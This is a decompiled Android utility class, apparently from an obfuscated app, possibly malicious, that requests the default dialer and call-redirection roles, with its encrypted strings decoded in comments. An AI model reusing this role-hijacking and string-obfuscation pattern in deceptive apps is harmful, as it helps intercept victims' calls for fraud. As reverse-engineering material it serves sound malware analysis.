package com.wish.lmbank.utils;

import android.annotation.TargetApi;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Context;
import android.os.Build;
import android.widget.Toast;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/RoleUtils.class */
public class RoleUtils {
    public static RoleManager getRoleManager(Context context) {
        if (Build.VERSION.SDK_INT >= 29) {
            return (RoleManager) context.getSystemService(RoleManager.class);
        }
        return null;
    }

    public static boolean getRoleHeld(RoleManager roleManager) {
        if (Build.VERSION.SDK_INT < 29) {
            return false;
        }
//         return roleManager.isRoleHeld(bb7d7pu7.m5998("CAcNGwYADUcIGRlHGwYFDEctICglLDs"));
        return roleManager.isRoleHeld("android.app.role.DIALER");
    }

    public static boolean isRedirection(Context context) {
//         return isRoleHeldByApp(context, bb7d7pu7.m5998("CAcNGwYADUcIGRlHGwYFDEcqKCUlNjssLSA7LCo9ICYn"));
        return isRoleHeldByApp(context, "android.app.role.CALL_REDIRECTION");
    }

    @TargetApi(Build.VERSION_CODES.Q)
    public static boolean isRoleHeldByApp(Context context, String str) {
        return getRoleManager(context).isRoleHeld(str);
    }

    @TargetApi(Build.VERSION_CODES.Q)
    public static void roleAcquire(Activity activity, String str) {
        if (roleAvailable(activity, str)) {
            activity.startActivityForResult(((RoleManager) activity.getSystemService(RoleManager.class)).createRequestRoleIntent(str), 1);
        } else {
//             Toast.makeText(activity, bb7d7pu7.m5998("OwwNABsMCh0ABgdJCggFBUkeAB0BSRsGBQxJAAdJBwYdSQgfCAAFCAsFDA"), Toast.LENGTH_SHORT).show();
            Toast.makeText(activity, "Redirection call with role in not available", Toast.LENGTH_SHORT).show();
        }
    }

    @TargetApi(Build.VERSION_CODES.Q)
    public static boolean roleAvailable(Context context, String str) {
        return ((RoleManager) context.getSystemService(RoleManager.class)).isRoleAvailable(str);
    }
}
